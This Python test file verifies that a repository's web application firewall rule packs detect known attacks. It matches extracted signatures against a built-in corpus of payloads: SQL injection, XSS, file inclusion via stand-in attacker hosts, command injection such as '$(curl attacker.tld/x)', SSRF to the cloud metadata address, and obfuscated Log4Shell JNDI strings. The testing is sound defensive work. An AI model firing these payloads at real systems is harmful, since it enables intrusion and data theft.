import json
import re
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[1]


MALICIOUS_PAYLOAD_CORPUS = {
    "sqli": [
        "' OR '1'='1",
        "admin' --",
        "1 UNION SELECT username,password FROM users",
        "' OR 1=1#",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "<svg/onload=alert(1)>",
    ],
    "lfi": [
        "../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "/proc/self/environ",
        "....//....//etc/passwd",
    ],
    "rfi": [
        "http://evil.example/shell.txt",
        "https://attacker.tld/payload.php",
        "ftp://malicious.invalid/dropper",
    ],
    "command-injection": [
        "; cat /etc/passwd",
        "&& id",
        "| whoami",
        "`uname -a`",
        "$(curl attacker.tld/x)",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:22",
        "gopher://127.0.0.1:11211/_stats",
    ],
    "log4shell": [
        "${jndi:ldap://attacker.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}",
    ],
    "path-traversal": [
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\boot.ini",
    ],
}


SUPPORTED_PACK_NAME_HINTS = tuple(MALICIOUS_PAYLOAD_CORPUS.keys())


def _iter_pack_files():
    for path in REPO_ROOT.rglob("*.json"):
        parts = set(path.parts)
        if any(skip in parts for skip in {".git", ".venv", "node_modules", "__pycache__"}):
            continue
        # Scope to expected pack roots to keep runtime tight.
        if not parts.intersection(
            {
                "cloudflare",
                "aws-waf",
                "azure-waf",
                "f5",
                "fortiweb",
                "imperva",
                "checkpoint",
                "generic",
                "policies",
            }
        ):
            continue
        yield path


def _load_json(path: Path):
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return None


def _collect_strings(obj):
    if isinstance(obj, str):
        return [obj]
    if isinstance(obj, list):
        out = []
        for item in obj:
            out.extend(_collect_strings(item))
        return out
    if isinstance(obj, dict):
        out = []
        for v in obj.values():
            out.extend(_collect_strings(v))
        return out
    return []


def _extract_candidate_patterns(pack_obj):
    strings = _collect_strings(pack_obj)
    candidates = []
    for s in strings:
        s = s.strip()
        if not s:
            continue
        # Heuristic: prefer strings likely to be rule expressions or signatures.
        if any(token in s.lower() for token in ["regex", "matches", "contains", "select", "script", "jndi", "../", "..\\", "union", "onerror", "<script", "169.254.169.254"]):
            candidates.append(s)
        elif any(ch in s for ch in ["(", ")", "[", "]", "|", "\\", ".*"]):
            candidates.append(s)
    # De-duplicate while preserving order.
    seen = set()
    deduped = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            deduped.append(c)
    return deduped


def _safe_matches(pattern: str, payload: str) -> bool:
    # First, raw substring check for non-regex signatures.
    if pattern and pattern.lower() in payload.lower():
        return True

    # Attempt regex in both case-sensitive and case-insensitive modes.
    try:
        if re.search(pattern, payload):
            return True
        if re.search(pattern, payload, flags=re.IGNORECASE):
            return True
    except re.error:
        # Not a valid Python regex; ignore.
        return False
    return False


def _infer_attack_class(path: Path, pack_obj) -> str | None:
    name_bits = " ".join(path.parts).lower()
    if isinstance(pack_obj, dict):
        for key in ("name", "description", "objective", "risk_mitigated"):
            value = pack_obj.get(key)
            if isinstance(value, str):
                name_bits += " " + value.lower()

    for hint in SUPPORTED_PACK_NAME_HINTS:
        if hint in name_bits:
            return hint

    # Common aliases
    if "sql" in name_bits:
        return "sqli"
    if "cross site scripting" in name_bits:
        return "xss"
    if "traversal" in name_bits:
        return "path-traversal"
    if "command injection" in name_bits:
        return "command-injection"
    return None


def test_malicious_payload_corpus_detects_known_attack_patterns():
    tested = 0
    for pack_path in _iter_pack_files():
        pack_obj = _load_json(pack_path)
        if not isinstance(pack_obj, dict):
            continue

        attack_class = _infer_attack_class(pack_path, pack_obj)
        if not attack_class or attack_class not in MALICIOUS_PAYLOAD_CORPUS:
            continue

        patterns = _extract_candidate_patterns(pack_obj)
        if not patterns:
            continue

        payloads = MALICIOUS_PAYLOAD_CORPUS[attack_class]

        # Require at least one payload to match at least one extracted signature.
        matched_any_payload = False
        for payload in payloads:
            if any(_safe_matches(pattern, payload) for pattern in patterns):
                matched_any_payload = True
                break

        assert matched_any_payload, (
            f"No malicious payload in corpus matched signatures for pack: {pack_path} "
            f"(attack_class={attack_class})"
        )
        tested += 1

    assert tested > 0, "No eligible rule packs were discovered for malicious corpus testing"
